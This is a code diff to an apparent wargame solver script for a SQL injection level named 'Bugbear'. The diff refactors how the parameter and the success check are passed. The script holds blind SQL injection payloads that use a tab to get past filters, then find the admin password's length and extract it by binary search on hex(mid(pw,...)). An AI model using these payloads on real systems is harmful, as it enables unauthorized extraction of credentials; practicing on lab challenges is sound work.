@@ -4,6 +4,10 @@ import los
 from getpass import getpass
 
 
+def check_func(response: str) -> bool:
+    return 'Hello admin' in response
+
+
 def main():
     '''
     Bugbear
@@ -36,13 +40,15 @@ def main():
         exit(1)
 
     payload = '0||length(pw)>%s&&id\tin("admin")#'
-    len_of_key = los.find_key_len(url, payload, 'no', 'Hello admin', cook)
+    param = dict(no=payload)
+    len_of_key = los.find_key_len(url, param, check_func, cook)
 
     print(len_of_key)
 
     payload = '0||id\tin("admin")&&hex(mid(pw,%s,1))%s#'
-    result = los.find_binary(url, payload,
-                             'no', 'Hello admin', 0x14, 0x7F, len_of_key, cook)
+    param = dict(no=payload)
+    result = los.find_binary(url, param, check_func,
+                             0x14, 0x7F, len_of_key, cook)
 
     print(result)
     # Convert to normal ascii
